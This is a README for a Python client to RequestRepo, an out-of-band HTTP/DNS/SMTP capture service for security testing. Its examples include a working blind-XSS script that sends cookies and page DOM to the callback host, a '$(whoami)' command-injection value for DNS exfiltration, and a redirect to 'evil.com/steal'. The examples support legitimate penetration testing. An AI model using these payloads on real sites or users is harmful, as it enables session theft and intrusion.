# requestrepo

Python client for [RequestRepo](https://requestrepo.com) — capture and analyze HTTP, DNS, SMTP, and TCP requests in real-time.

Built for AI agents, security researchers, and automation pipelines.

## Install

```bash
pip install requestrepo
```

## Quick Start

```python
from requestrepo import RequestRepo

with RequestRepo() as repo:
    print(f"Send requests to: {repo.url}")
    req = repo.wait_for_http(timeout=30)
    print(f"{req.method} {req.path} from {req.ip}")
```

## Common Use Cases

### SSRF Detection

```python
from requestrepo import RequestRepo, RequestRepoTimeoutError

with RequestRepo() as repo:
    # Use repo.url as the callback target
    trigger_ssrf(f"{repo.url}/callback?token=secret")

    try:
        req = repo.wait_for_http(timeout=30, path="/callback")
        print(f"SSRF confirmed! Request from {req.ip}")
        print(f"Method: {req.method}, URL: {req.url}")
        print(f"Headers: {req.headers}")
    except RequestRepoTimeoutError:
        print("No callback received — not vulnerable")
```

### Email / OTP Capture

```python
from requestrepo import RequestRepo

with RequestRepo() as repo:
    # Use repo.email for account registration
    register_account(email=repo.email)

    # Wait for the verification email
    email = repo.wait_for_email(timeout=120, subject="verification")

    print(f"From: {email.sender}")
    print(f"Subject: {email.subject}")
    print(f"Body: {email.text}")  # Plain text body, parsed from MIME

    # Extract OTP from email text
    import re
    otp = re.search(r'\d{6}', email.text).group()
    print(f"OTP: {otp}")
```

### DNS Exfiltration Monitoring

```python
from requestrepo import RequestRepo, RequestType

with RequestRepo() as repo:
    # The target will query: {data}.{repo.domain}
    inject_payload(f"$(whoami).{repo.domain}")

    req = repo.wait_for_dns(timeout=60)
    exfil_data = req.domain.split(".")[0]
    print(f"Exfiltrated: {exfil_data}")

    # Monitor multiple DNS queries
    for req in repo.listen(timeout=120, match=lambda r: r.type == RequestType.DNS):
        label = req.domain.removesuffix(f".{repo.domain}.").split(".")[0]
        print(f"DNS exfil: {label} (type: {req.query_type})")
```

### Blind XSS Payload

```python
from requestrepo import RequestRepo

with RequestRepo() as repo:
    # Set up a payload that phones home
    payload = f"""<script>
    fetch('{repo.url}/xss', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
            cookies: document.cookie,
            url: location.href,
            dom: document.body.innerHTML.substring(0, 1000)
        }})
    }});
    </script>"""

    # Host the payload
    repo.set_response("index.html", payload)
    print(f"XSS payload URL: {repo.url}")

    # Wait for it to fire
    req = repo.wait_for_http(method="POST", path="/xss", timeout=300)
    stolen = req.json()
    print(f"Cookies: {stolen['cookies']}")
    print(f"Page URL: {stolen['url']}")
```

### Custom HTTP Response

```python
from requestrepo import RequestRepo

with RequestRepo() as repo:
    # Serve JSON
    repo.set_response("api/data", '{"status": "ok", "flag": "CTF{found_it}"}',
        headers={"Content-Type": "application/json"})

    # Serve a redirect
    repo.set_response("redirect", "", status_code=302,
        headers={"Location": "https://evil.com/steal"})

    # Serve HTML
    repo.set_response("index.html", "<h1>Hello from RequestRepo</h1>")

    print(f"JSON endpoint: {repo.url}/api/data")
    print(f"Redirect: {repo.url}/redirect")
```

### Webhook Capture

```python
from requestrepo import RequestRepo

with RequestRepo() as repo:
    # Register webhook URL with a service
    register_webhook(f"{repo.url}/webhook")

    # Wait for the webhook POST
    req = repo.wait_for_http(method="POST", path="/webhook", timeout=60)

    print(f"Webhook received!")
    print(f"Content-Type: {req.content_type}")
    print(f"Body: {req.text}")

    # Parse JSON webhook payload
    data = req.json()
    print(f"Event: {data.get('event')}")
```

### DNS Configuration

```python
from requestrepo import RequestRepo, DnsRecord

with RequestRepo() as repo:
    # Point all subdomains to your IP (for DNS rebinding, SSRF, etc.)
    repo.add_dns("*", "A", "10.0.0.1")

    # Add a TXT record
    repo.add_dns("_verify", "TXT", "verification-token-123")

    # Records are additive — both A and TXT exist now
    print(f"DNS domain: {repo.domain}")
    print(f"Records: {repo.get_dns()}")

    # Replace all records at once
    repo.set_dns(
        DnsRecord(domain="*", record_type="A", value="192.168.1.1"),
        DnsRecord(domain="*", record_type="AAAA", value="::1"),
    )
```

### Stream Multiple Requests

```python
from requestrepo import RequestRepo, HttpRequest, DnsRequest

with RequestRepo() as repo:
    print(f"Listening on {repo.url} for 5 minutes...")

    for req in repo.listen(timeout=300):
        if isinstance(req, HttpRequest):
            print(f"[HTTP] {req.method} {req.path} from {req.ip}")
        elif isinstance(req, DnsRequest):
            print(f"[DNS] {req.query_type} {req.domain} from {req.ip}")
        else:
            print(f"[{req.type.value.upper()}] from {req.ip}")
```

## Session Reuse

Sessions persist for 1 year. Save the token to reuse across runs:

```python
from requestrepo import RequestRepo

# First run — create session
repo = RequestRepo()
print(f"Save this token: {repo.token}")
# Save token to file, env var, etc.

# Later — reuse the same session and subdomain
repo = RequestRepo(token="eyJ...")
print(f"Same subdomain: {repo.url}")
```

## Self-Hosted Instances

```python
from requestrepo import RequestRepo

repo = RequestRepo(
    host="rr.internal.company.com",
    port=8443,
    protocol="https",
    admin_token="your-admin-token",
)
```

## Error Handling

```python
from requestrepo import (
    RequestRepo,
    RequestRepoTimeoutError,
    RequestRepoConnectionError,
    AuthError,
    RateLimitError,
)

try:
    with RequestRepo() as repo:
        req = repo.wait_for_http(timeout=10)
except RequestRepoTimeoutError:
    print("No request received within timeout")
except RequestRepoConnectionError:
    print("WebSocket disconnected")
except AuthError:
    print("Invalid or expired token")
except RateLimitError as e:
    print(f"Rate limited — retry after {e.retry_after}s")
```

## Timeout Behavior

```python
# Default: 30 seconds (60s for email)
req = repo.wait_for_http()              # timeout=30

# Custom timeout
req = repo.wait_for_http(timeout=120)   # wait up to 2 minutes

# Wait forever (use with caution!)
req = repo.wait_for_http(timeout=None)

# Non-blocking check (returns immediately)
try:
    req = repo.wait_for_http(timeout=0)  # check queue, don't wait
except RequestRepoTimeoutError:
    print("Nothing in queue yet")
```

## API Reference

### Properties

| Property | Example | Description |
|----------|---------|-------------|
| `repo.subdomain` | `"abc12345"` | Session identifier |
| `repo.domain` | `"abc12345.requestrepo.com"` | Full session domain |
| `repo.url` | `"https://abc12345.requestrepo.com"` | Base URL |
| `repo.email` | `"test@abc12345.requestrepo.com"` | Catch-all email address |
| `repo.token` | `"eyJ..."` | JWT for session reuse |
| `repo.connected` | `True` | WebSocket status |

### Wait Methods

| Method | Returns | Default Timeout |
|--------|---------|----------------|
| `wait_for_request(timeout, match=)` | `AnyRequest` | 30s |
| `wait_for_http(timeout, method=, path=, match=)` | `HttpRequest` | 30s |
| `wait_for_dns(timeout, query_type=, domain=, match=)` | `DnsRequest` | 30s |
| `wait_for_smtp(timeout, subject=, sender=, match=)` | `SmtpRequest` | 60s |
| `wait_for_email(timeout, subject=, sender=, match=)` | `SmtpRequest` | 60s |
| `wait_for_tcp(timeout, match=)` | `TcpRequest` | 30s |
| `listen(timeout, match=)` | `Iterator[AnyRequest]` | None (forever) |

### Request Fields

**HttpRequest**: `method`, `path`, `query`, `url`, `protocol`, `headers`, `body`, `text`, `json()`, `content_type`

**DnsRequest**: `query_type`, `domain`, `reply`

**SmtpRequest**: `sender`, `to`, `subject`, `data`, `text`, `html`, `attachments`, `command`

**TcpRequest**: `server_port`

**All requests**: `id`, `type`, `ip`, `port`, `country`, `date`, `timestamp`, `raw`
